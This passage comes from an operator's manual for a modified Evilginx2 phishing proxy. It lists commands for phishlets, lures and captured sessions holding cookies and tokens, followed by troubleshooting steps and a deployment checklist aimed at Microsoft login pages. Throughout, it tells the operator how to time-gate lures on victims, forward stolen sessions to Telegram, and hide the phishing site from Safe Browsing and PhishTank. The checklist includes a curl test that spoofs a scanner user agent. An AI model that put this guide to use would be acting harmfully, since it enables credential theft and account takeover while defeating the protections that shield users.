| `config dashboard-user <user>` | Update dashboard username (live, no restart needed) |
| `config dashboard-pass <pass>` | Update dashboard password (live, no restart needed) |

## Redirect page commands

| Command | Description |
|---------|-------------|
| `redirects list` | List all configured redirect pages |
| `redirects add <sub> <file> [url] [on\|off]` | Add redirect page on subdomain |
| `redirects delete <index>` | Remove a redirect page |

**`redirects add` syntax:**

```
# Serve file as-is (HTML handles its own redirect)
redirects add landing loading.html

# Redirect to URL after page loads
redirects add landing loading.html https://target.com

# Redirect to URL after Turnstile challenge
redirects add landing loading.html https://target.com on

# Serve file as-is, but with Turnstile gate
redirects add landing loading.html on
```

## Phishlet commands

| Command | Description |
|---------|-------------|
| `phishlets hostname <name> <domain>` | Set phishlet domain |
| `phishlets enable <name>` | Enable a phishlet |
| `phishlets disable <name>` | Disable a phishlet |
| `phishlets hide <name>` | Hide phishlet (redirect all non-lure traffic) |
| `phishlets unhide <name>` | Unhide phishlet |
| `phishlets reload <name>` | Re-read a single phishlet YAML from disk without restarting |
| `phishlets refresh` | Re-read ALL phishlet YAMLs and register any new `.yaml` files added since startup |
| `phishlets list` | List all phishlets and status |

## Lure commands

| Command | Description |
|---------|-------------|
| `lures create <phishlet> [subdomain]` | Create lure; optionally pin to a subdomain |
| `lures get-url <index>` | Get the phishing URL |
| `lures list` | List all lures |
| `lures clone <index>` | Duplicate a lure with all its settings and a new random path |
| `lures delete <index>` | Delete a lure |
| `lures edit <index> <field> <value>` | Edit lure settings (see fields below) |
| `lures pause <index> <duration>` | Pause a lure (e.g. `1h`, `30m`) |
| `lures unpause <index>` | Unpause a lure |

**`lures edit` fields:**

| Field | Example value | Description |
|-------|--------------|-------------|
| `path` | `/AbCdEfGh` | URL path for the lure |
| `hostname` | `login.yoursite.com` | Custom subdomain for this lure |
| `redirect_url` | `https://microsoft.com` | Where to send victim after capture |
| `ua_filter` | `Mobile` | Regex; only allow matching User-Agents |
| `redirector` | `turnstile` | Pre-phishing redirector directory name |
| `active_hours` | `08:00-18:00` | Only serve lure between these hours |
| `active_days` | `Mon,Tue,Wed,Thu,Fri` | Only serve lure on these days |
| `active_tz` | `America/New_York` | IANA timezone for active_hours/active_days |
| `info` | `Campaign A` | Internal label (not visible to victims) |
| `og_title` | `Microsoft Login` | OpenGraph title for link previews |
| `og_desc` | `Sign in to...` | OpenGraph description |
| `og_image` | `https://...` | OpenGraph image URL |
| `og_url` | `https://...` | OpenGraph canonical URL |

**Time-gated lures example (Mon–Fri business hours, US Eastern):**

```
lures edit 0 active_hours 08:00-18:00
lures edit 0 active_days Mon,Tue,Wed,Thu,Fri
lures edit 0 active_tz America/New_York
```

Outside the configured window, the lure path returns a 404 / `unauth_url`. Clear a field by passing an empty string: `lures edit 0 active_hours ""`

## Autolure commands

| Command | Description |
|---------|-------------|
| `autolures` | List all auto-rotating lures with countdown |
| `autolures create <phishlet> <subdomain> [interval]` | Create autolure (interval e.g. `1h`, `30m`; default random 45-90m) |
| `autolures get-url <id>` | Show gateway URL and current active path |
| `autolures notify <id> on\|off` | Enable/disable Telegram notification on rotation |
| `autolures delete <id>` | Delete an autolure |

## Session commands

| Command | Description |
|---------|-------------|
| `sessions` | List all sessions |
| `sessions <id>` | Show session detail (cookies, tokens, GeoIP) |
| `sessions delete <id>` | Delete a session |

## Blacklist commands

| Command | Description |
|---------|-------------|
| `blacklist all` | Block everyone except whitelisted IPs |
| `blacklist unauth` | Block unauthorized visitors only (recommended) |
| `blacklist noadd` | Redirect but don't add to blacklist |
| `blacklist off` | Disable blacklist |
| `blacklist log on/off` | Toggle verbose blacklist logging |
| `blacklist delete <ip>` | Remove an IP from the blacklist immediately (in-memory + config file) |

> **Scanner UA cloaking is automatic** — known crawlers and security scanners (GSB, PhishTank, curl, python-requests, link previewers, etc.) are intercepted before any phishing logic runs and served the `unauth_url` content. Set `blacklist unauth` and `config unauth_url` to activate.

## System commands

| Command | Description |
|---------|-------------|
| `config telegram test` | Send a test Telegram message |
| `clear` | Clear the terminal |
| `help` | List all commands |
| `exit` | Exit Evilginx (saves config) |

## Systemd commands

```bash
systemctl start evilginx       # Start
systemctl stop evilginx        # Stop
systemctl restart evilginx     # Restart
systemctl status evilginx      # Check status
journalctl -u evilginx -f      # Live logs
journalctl -u evilginx -n 100  # Last 100 lines
```

---

# PART 18: TROUBLESHOOTING

## Wildcard certificate not loading

```bash
# Check files exist
ls -la /root/.evilginx/crt/wildcard/

# Check it's a wildcard
openssl x509 -in /root/.evilginx/crt/wildcard/fullchain.pem -noout -subject
# Must show: CN = *.yoursite.com

# Check domain is set
cat /root/.evilginx/config.json | grep domain

# Restart after fixing
systemctl restart evilginx
journalctl -u evilginx | grep wildcard
```

## Dashboard not accessible

```bash
systemctl status evilginx         # Is it running?
ufw status | grep 5000            # Is port 5000 open?
ss -tlnp | grep 5000              # Is it listening?
```

For HTTPS subdomain access: ensure `config dashboardsub` is set and the wildcard cert is loaded.

## Dashboard subdomain returns wrong page

The virtual host dispatch happens before phishlet routing. Ensure the subdomain you set with `config dashboardsub` doesn't conflict with any phishlet's assigned subdomain.

## Redirect page not loading

```bash
ls -la /root/.evilginx/redirects/   # Is the file there?
redirects list                       # Is it registered?
```

Verify the subdomain in `redirects list` matches the URL you're visiting.

## DNS not resolving

```bash
dig @1.1.1.1 yoursite.com +short
dig @1.1.1.1 test.yoursite.com +short
```

Both must return your VPS IP. If not, check Cloudflare DNS records are set to DNS Only (grey cloud).

## Port 53 still in use after setup

```bash
lsof -i :53
systemctl stop systemd-resolved
systemctl disable systemd-resolved
reboot
```

## No Telegram notifications

```bash
# Test the token directly
curl -s "https://api.telegram.org/botYOUR_TOKEN/getMe"

# From Evilginx terminal
config telegram test
```

Check that `config teletoken` and `config chatid` are both set.

## GeoIP not showing data

```bash
ls -lh /root/.evilginx/GeoIP/    # Files present?
journalctl -u evilginx | grep geoip
```

Ensure the `-geoip-db` flag points to the directory containing the `.mmdb` files, not to the files themselves.

## Hostname collision warning after phishlets refresh

```
[war] phishlets: hostname 'login.microsoftonline.com' collision between 'Microsoft2024' and 'o365new' phishlets
```

Two phishlets in your directory target the same real domain. This is fine as long as only one is enabled at a time. Disable the one you're not using:

```
phishlets disable Microsoft2024
```

If both are enabled simultaneously, lure routing becomes ambiguous — incoming requests for that domain may be routed to the wrong phishlet.

## Build fails

```bash
cd /root/evilginx2
go clean -modcache
go mod tidy
go build -mod=mod -o evilginx2 .
```

If `go: command not found`, run `source ~/.bashrc` or reconnect SSH.

---

# PART 19: DEPLOYMENT CHECKLIST

### Server
- [ ] SSH works
- [ ] Packages installed
- [ ] Firewall active: ports 22, 53, 80, 443, 5000 open
- [ ] Port 53 free (systemd-resolved disabled)
- [ ] Go installed (`go version`)

### DNS
- [ ] Domain on Cloudflare with Cloudflare nameservers
- [ ] `@` and `*` A records → VPS IP, DNS Only (grey cloud)
- [ ] SSL/TLS set to Full
- [ ] `dig @1.1.1.1 yoursite.com +short` → VPS IP
- [ ] `dig @1.1.1.1 test.yoursite.com +short` → VPS IP

### Wildcard Certificate
- [ ] `fullchain.pem` and `privkey.pem` in `/root/.evilginx/crt/wildcard/`
- [ ] Subject shows `CN = *.yoursite.com`
- [ ] Startup shows `[wld] using wildcard certificate`

### Evilginx Config
- [ ] `config domain` set
- [ ] `config ipv4 external` set
- [ ] `config autocert on`
- [ ] `config unauth_url https://login.microsoftonline.com` set
- [ ] `config unauth_redirect on` set
- [ ] `blacklist unauth` set
- [ ] `config strip_headers on` set
- [ ] `config teletoken` and `config chatid` set
- [ ] `config telegram test` succeeds

### Anti-Safe-Browsing (do not skip)
- [ ] Port `80/tcp` open and the plain-HTTP listener bound (`ss -tlnp | grep ':80 '`)
- [ ] `http://YOUR_DOMAIN/` returns `301/302` to `https://`
- [ ] Scanner UA returns a clean `302` to the real login:
      `curl -sD- -o /dev/null -A 'Mozilla/5.0 (compatible; Google-SafeBrowsing/2.0)' https://login.yoursite.com/auth/login`
- [ ] A fresh browser on the lure URL shows the real login page (title `Sign in to your account`)
- [ ] A blacklisted IP can still complete the lure flow
- [ ] `https://transparencyreport.google.com/transparencyreport/api/v3/safebrowsing/status?site=yoursite.com` reports clean

### GeoIP
- [ ] `GeoLite2-City.mmdb` and `GeoLite2-ASN.mmdb` in `/root/.evilginx/GeoIP/`
- [ ] Startup shows `GeoIP initialized`

### Phishlet
- [ ] `phishlets hostname o365 yoursite.com`
- [ ] `phishlets enable o365`
- [ ] Lure created and URL works in browser
- [ ] Login page matches official Microsoft login

### Dashboard
- [ ] Accessible at `http://IP:5000`
- [ ] If subdomain configured: `https://panel.yoursite.com` works over HTTPS
- [ ] Login works, sessions visible

### Systemd
- [ ] Service file created with correct flags
- [ ] `systemctl enable evilginx` done
- [ ] Status shows `active (running)`

### Optional
- [ ] Redirect pages added to `~/.evilginx/redirects/` and configured
- [ ] Turnstile enabled (if using)
- [ ] VPN/country blocking configured (if using)

---

*Evilginx2 Telegram Edition by @officialmonsterz*  
*Based on original work by Kuba Gretzky (@mrgretzky)*
